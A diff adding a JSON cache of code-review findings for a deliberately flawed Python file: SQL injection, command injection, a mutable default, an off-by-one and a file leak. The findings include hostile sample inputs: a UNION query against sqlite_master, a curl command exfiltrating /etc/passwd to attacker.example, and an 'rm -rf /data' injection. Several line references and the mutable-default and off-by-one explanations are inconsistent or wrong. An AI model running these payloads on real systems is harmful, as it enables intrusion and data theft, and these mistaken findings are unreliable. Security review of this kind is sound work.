@@ -1,0 +1,275 @@
+{
+  "fa25ed6f6016353e": {
+    "_ts": 1788271538.3650107,
+    "findings": [],
+    "feedback": {}
+  },
+  "edf255a400b0c40a": {
+    "_ts": 1788271700.7873418,
+    "findings": [],
+    "feedback": {}
+  },
+  "d3e63926dc867708": {
+    "_ts": 1788331809.3088863,
+    "findings": [],
+    "feedback": {}
+  },
+  "922f449581eba1d2": {
+    "_ts": 1788323807.6220694,
+    "findings": [],
+    "feedback": {}
+  },
+  "23c47f16389a9ff3": {
+    "_ts": 1788328582.6964786,
+    "findings": [
+      {
+        "review_id": "F1",
+        "review_status": "agreed",
+        "review_axis": "security",
+        "debate_note": "Trigger and wrong result are grounded in the supplied line.",
+        "severity": "high",
+        "title": "SQL injection: user input concatenated into an executed query",
+        "file": "flawed.py",
+        "line": 10,
+        "line_end": 11,
+        "category": "Correctness and security",
+        "confidence": 92,
+        "summary": "user_id is concatenated into the SQL string and executed without parameterisation.",
+        "impact": "An attacker controls query structure and can read or destroy any table the connection can reach.",
+        "explanation": "`\"SELECT * FROM users WHERE id = \" + user_id` puts caller-controlled text into the statement text. Nothing between the function entry and `conn.execute` constrains it.",
+        "attack_input": "load_user(conn, '0 UNION SELECT name, sql, 1 FROM sqlite_master')",
+        "attack_execution": "The concatenated string is handed straight to conn.execute.",
+        "attack_result": "The injected predicate executes and returns schema data the caller was never meant to see.",
+        "evidence": "8: \n9: def load_user(conn, user_id):\n10:     query = \"SELECT * FROM users WHERE id = \" + user_id\n11:     return conn.execute(query).fetchone()\n12: \n13: ",
+        "audit_log": [
+          "Entry point: load_user(conn, user_id)",
+          "Sink: conn.execute(query) on line 13"
+        ],
+        "fix_suggestions": [
+          {
+            "id": "parameterize",
+            "label": "Use a bound parameter",
+            "profile": "recommended",
+            "description": "return conn.execute(\"SELECT * FROM users WHERE id = ?\", (user_id,)).fetchone()"
+          }
+        ],
+        "recommendation": "return conn.execute(\"SELECT * FROM users WHERE id = ?\", (user_id,)).fetchone()"
+      },
+      {
+        "review_id": "F2",
+        "review_status": "agreed",
+        "review_axis": "security",
+        "debate_note": "Trigger and wrong result are grounded in the supplied line.",
+        "severity": "high",
+        "title": "Command injection: unquoted argument interpolated into a shell command",
+        "file": "flawed.py",
+        "line": 15,
+        "line_end": 15,
+        "category": "Correctness and security",
+        "confidence": 90,
+        "summary": "`name` is interpolated into a shell string passed to os.system.",
+        "impact": "A caller who controls `name` runs arbitrary shell commands as the service user.",
+        "explanation": "`os.system` invokes /bin/sh -c. With `\"sh report.sh \" + name`, a name containing `; rm -rf /data ;` closes the first command and starts a second one.",
+        "attack_input": "run_report('x; curl attacker.example/$(cat /etc/passwd)')",
+        "attack_execution": "The shell parses the metacharacters and runs the appended command.",
+        "attack_result": "Arbitrary command execution on the host running the report job.",
+        "evidence": "13: \n14: def run_report(name):\n15:     os.system(\"sh report.sh \" + name)\n16: \n17: ",
+        "audit_log": [
+          "Entry point: run_report(name)",
+          "Sink: os.system on line 17"
+        ],
+        "fix_suggestions": [
+          {
+            "id": "subprocess-list",
+            "label": "Use subprocess with an argument list",
+            "profile": "recommended",
+            "description": "subprocess.run([\"sh\", \"report.sh\", name], check=True) — no shell is spawned, so metacharacters are inert."
+          }
+        ],
+        "recommendation": "subprocess.run([\"sh\", \"report.sh\", name], check=True) — no shell is spawned, so metacharacters are inert."
+      },
+      {
+        "review_id": "F3",
+        "review_status": "agreed",
+        "review_axis": "correctness",
+        "debate_note": "Trigger and wrong result are grounded in the supplied line.",
+        "severity": "medium",
+        "title": "Mutable default argument is shared across calls",
+        "file": "flawed.py",
+        "line": 18,
+        "line_end": 18,
+        "category": "Correctness",
+        "confidence": 95,
+        "summary": "`values=[]` is evaluated once at import and mutated in the body, so state leaks between calls.",
+        "impact": "The second call to average() sees the first call's values, producing wrong totals that are hard to reproduce.",
+        "explanation": "Python binds the default list object at function definition time. `values.append(0)` mutates that same object, so it persists for the life of the module.",
+        "attack_input": "average([1, 2, 3]) then average([10])",
+        "attack_execution": "The second call starts from [0, 1, 2, 3, 0] instead of [10, 0].",
+        "attack_result": "average([10]) returns 1.2 instead of 5.0.",
+        "evidence": "16: \n17: \n18: def average(values=[]):\n19:     values.append(0)\n20:     total = 0",
+        "audit_log": [
+          "Inspected function signature and body",
+          "No defensive copy exists before the append"
+        ],
+        "fix_suggestions": [
+          {
+            "id": "none-default",
+            "label": "Default to None and copy inside",
+            "profile": "recommended",
+            "description": "def average(values=None): values = list(values) if values is not None else []"
+          }
+        ],
+        "recommendation": "def average(values=None): values = list(values) if values is not None else []"
+      },
+      {
+        "review_id": "F4",
+        "review_status": "agreed",
+        "review_axis": "correctness",
+        "debate_note": "Trigger and wrong result are grounded in the supplied line.",
+        "severity": "medium",
+        "title": "Off-by-one: loop runs one index past the end of the list",
+        "file": "flawed.py",
+        "line": 21,
+        "line_end": 22,
+        "category": "Correctness",
+        "confidence": 97,
+        "summary": "`range(len(values) + 1)` indexes values[len(values)], which does not exist.",
+        "impact": "Every call raises IndexError, so average() never returns.",
+        "explanation": "The final iteration reads index 23+1 = the element one past the last one. Python raises IndexError instead of wrapping.",
+        "attack_input": "average([1, 2, 3])",
+        "attack_execution": "Iteration reaches i = len(values) and evaluates values[len(values)].",
+        "attack_result": "IndexError: list index out of range on line 23.",
+        "evidence": "19:     values.append(0)\n20:     total = 0\n21:     for index in range(len(values) + 1):\n22:         total += values[index]\n23:     return total / len(values)\n24: ",
+        "audit_log": [
+          "Traced the loop bound against the list length"
+        ],
+        "fix_suggestions": [
+          {
+            "id": "fix-range",
+            "label": "Iterate the values directly",
+            "profile": "recommended",
+            "description": "for value in values: total += value  — or range(len(values)) if the index is needed."
+          }
+        ],
+        "recommendation": "for value in values: total += value  — or range(len(values)) if the index is needed."
+      },
+      {
+        "review_id": "F5",
+        "review_status": "agreed",
+        "review_axis": "correctness",
+        "debate_note": "Trigger and wrong result are grounded in the supplied line.",
+        "severity": "low",
+        "title": "File handle is opened and never closed",
+        "file": "flawed.py",
+        "line": 27,
+        "line_end": 28,
+        "category": "Correctness",
+        "confidence": 88,
+        "summary": "`open(path)` result is returned from without closing, leaking the descriptor until GC.",
+        "impact": "Under load the process exhausts its file descriptor limit and starts failing unrelated opens.",
+        "explanation": "There is no context manager and no finally block, so the descriptor stays open until the object is collected.",
+        "attack_input": "read_config called in a loop over many files",
+        "attack_execution": "Each iteration leaks one descriptor.",
+        "attack_result": "OSError: [Errno 24] Too many open files.",
+        "evidence": "25: \n26: def read_config(path):\n27:     handle = open(path)\n28:     return handle.read()\n29: \n30: ",
+        "audit_log": [
+          "No `with` block or close() on this path"
+        ],
+        "fix_suggestions": [
+          {
+            "id": "with-block",
+            "label": "Use a context manager",
+            "profile": "recommended",
+            "description": "with open(path, encoding='utf-8') as handle: return handle.read()"
+          }
+        ],
+        "recommendation": "with open(path, encoding='utf-8') as handle: return handle.read()"
+      },
+      {
+        "source": "heuristic",
+        "severity": "critical",
+        "title": "Possible command injection through shell execution",
+        "file": "flawed.py",
+        "line": 1,
+        "category": "Command injection",
+        "confidence": 84,
+        "summary": "CodeGuard found a high-signal command injection pattern that appears reachable from untrusted input.",
+        "impact": "The affected flow may allow command injection exploitation if the input is attacker-controlled.",
+        "explanation": "This file contains a sensitive command injection sink and nearby untrusted-input markers in the same execution area.",
+        "attack_input": "An attacker sends crafted input through the reachable request or integration entry point.",
+        "attack_execution": "The input flows into the matched sink without a strong trust-boundary check in the reviewed code.",
+        "attack_result": "The application may suffer command injection impact on this path.",
+        "evidence": "1: import os\n2: import sqlite3\n3: ",
+        "audit_log": [
+          "Matched a high-confidence heuristic detector",
+          "Captured evidence from flawed.py:1",
+          "Queued the candidate for AI validation"
+        ],
+        "fix_suggestions": [
+          {
+            "id": "recommended",
+            "label": "Fix A",
+            "profile": "recommended",
+            "description": "Refactor the command injection path so untrusted input cannot reach the sensitive sink directly."
+          },
+          {
+            "id": "safe",
+            "label": "Fix B",
+            "profile": "safe",
+            "description": "Add explicit validation, canonicalization, and trust-boundary checks before this branch executes."
+          },
+          {
+            "id": "fast",
+            "label": "Fix C",
+            "profile": "fast",
+            "description": "Add an immediate guard clause to reduce exposure while the full remediation is prepared."
+          }
+        ],
+        "line_end": 1
+      },
+      {
+        "source": "heuristic",
+        "severity": "high",
+        "title": "Dynamic query construction may allow injection",
+        "file": "flawed.py",
+        "line": 1,
+        "category": "SQL injection",
+        "confidence": 80,
+        "summary": "CodeGuard found a high-signal sql injection pattern that appears reachable from untrusted input.",
+        "impact": "The affected flow may allow sql injection exploitation if the input is attacker-controlled.",
+        "explanation": "This file contains a sensitive sql injection sink and nearby untrusted-input markers in the same execution area.",
+        "attack_input": "An attacker sends crafted input through the reachable request or integration entry point.",
+        "attack_execution": "The input flows into the matched sink without a strong trust-boundary check in the reviewed code.",
+        "attack_result": "The application may suffer sql injection impact on this path.",
+        "evidence": "1: import os\n2: import sqlite3\n3: ",
+        "audit_log": [
+          "Matched a high-confidence heuristic detector",
+          "Captured evidence from flawed.py:1",
+          "Queued the candidate for AI validation"
+        ],
+        "fix_suggestions": [
+          {
+            "id": "recommended",
+            "label": "Fix A",
+            "profile": "recommended",
+            "description": "Refactor the sql injection path so untrusted input cannot reach the sensitive sink directly."
+          },
+          {
+            "id": "safe",
+            "label": "Fix B",
+            "profile": "safe",
+            "description": "Add explicit validation, canonicalization, and trust-boundary checks before this branch executes."
+          },
+          {
+            "id": "fast",
+            "label": "Fix C",
+            "profile": "fast",
+            "description": "Add an immediate guard clause to reduce exposure while the full remediation is prepared."
+          }
+        ],
+        "line_end": 1
+      }
+    ],
+    "feedback": {}
+  }
+}
